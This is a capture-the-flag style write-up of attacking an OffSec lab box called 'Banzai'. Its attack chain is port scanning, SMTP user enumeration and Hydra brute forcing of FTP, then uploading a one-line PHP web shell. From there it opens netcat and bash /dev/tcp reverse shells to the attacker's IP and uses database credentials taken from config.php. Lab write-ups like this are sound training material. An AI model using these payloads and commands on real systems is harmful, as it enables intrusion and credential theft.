---
description: 'Date: 08/31/22'
---

# "Banzai" (Intermediate)

## Recon

```
sudo nmap -sS -p- -sV -sC 192.168.78.56 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 22:42 EDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 22:42 (0:00:04 remaining)
Nmap scan report for 192.168.78.56
Host is up (0.10s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
8080/tcp open   http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We learn that there is more than meets the eye with -p- discovering an open port on 8295

```
sudo nmap -sS -p 8295 -sV -sC 192.168.78.56                 Wed 31 Aug 2022 08:56:34 PM EDT
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 20:56 EDT
Nmap scan report for 192.168.78.56
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
8295/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Banzai
|_http-server-header: Apache/2.4.25 (Debian)
```

## Visual Inspection

* I attempt to go check out the web server but I am immediately hit with a 403 forbidden.
* Naturally, in an attempt to bypass this restriction, I try to bypass with burp:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses" %}

* Unfortunately, this does not work.&#x20;
* Time to move on.

## FTP

### Anonymous Access

```
ftp 192.168.78.56 21
anonymous
anonymous
Failed
```

## SMTP User  Enumeration with simple-users.txt

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/simple-users.txt -t 192.168.78.56

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/simple-users.txt
Target count ............. 1
Username count ........... 40
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Aug 31 20:38:58 2022 #########
192.168.78.56: admin exists
192.168.78.56: backup exists
192.168.78.56: ftp exists
192.168.78.56: mail exists
192.168.78.56: mysql exists
192.168.78.56: nobody exists
192.168.78.56: postfix exists
192.168.78.56: postgres exists
192.168.78.56: root exists
192.168.78.56: sys exists
192.168.78.56: www-data exists
192.168.78.56: webmaster exists
######## Scan completed at Wed Aug 31 20:39:02 2022 #########
12 results.

40 queries in 4 seconds (10.0 queries / sec)
```

* We see that admin exists. Let's try to bruteforce this using Hydra in conjunction with rockyou.txt

### Bruteforcing with Hydra

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.78.56 ftp
```

This verified that weak credentials are in play:

Username: admin

Password: admin

## FTP Exploitation

Backdoor.php

* This backdoor will allow us to execute code through the URL

```
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
```

#### Using PUT to send a file to the FTP server since we have write access

```
ftp 192.168.78.56 21
admin
admin
Login Successful.
Put backdoor.php
```

## Code Execution

```
http://192.168.78.56:8295/backdoor2.php?cmd=whoami
www-data
```

#### Reverse Shell

Start Netcat listener on an open port

```
nc -lnvp 8295
```

```
http://192.168.78.56:8295/backdoor.php?cmd=nc -e /bin/sh 192.168.49.78 8295
```

## Foothold Proof

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Upon going back a directory, we find config.php

```
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

#### Shell Upgrade

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

* The first thing that I do is grab the flag.
* After grabbing the user flag, I run netstat -tulnp to see what is running internally

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8295                 :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::5432                 :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -   
```

* We see that 3306/MYSQL is running.
* Let's try our new credentials here!

### MySQL Enumeration

Authentication

```
mysql -u root -p
Enter Password: EscalateRaftHubris123
mysql>
```

* Success! Time to enumerate!

### DB Enumeration

```
show databases;
use <database>;
show tables;
describe <table_name>;

```

* I was unable to find anything useful in here
* <mark style="background-color:orange;">mysql version: 5.7.30</mark>

### Searchsploit

```
searchsploit mysql 5.7
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation | linux/local/40679.sh

```

* Locate 40679.sh

select sys\_exec('bash -c "bash -i >& /dev/tcp/192.168.49.78/8080 0>&1"');

## Exploit Research

#### What do we have to work with?

* <mark style="color:yellow;">Apache 2.4.25</mark>
  * <mark style="color:yellow;">50512.py -- RCE</mark>
  * <mark style="color:yellow;"></mark>[<mark style="color:yellow;">https://www.exploit-db.com/exploits/50512</mark>](https://www.exploit-db.com/exploits/50512)<mark style="color:yellow;"></mark>
    * <mark style="color:yellow;">This did not work.</mark>
* <mark style="color:yellow;">VSFTPD 3.0.3</mark>
* <mark style="color:yellow;">PostGreSQL 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17</mark>



## This remains unfinished due to the weird privilege escalation with mysql. I kept getting a strange error after numerous attempts. Moving on.



















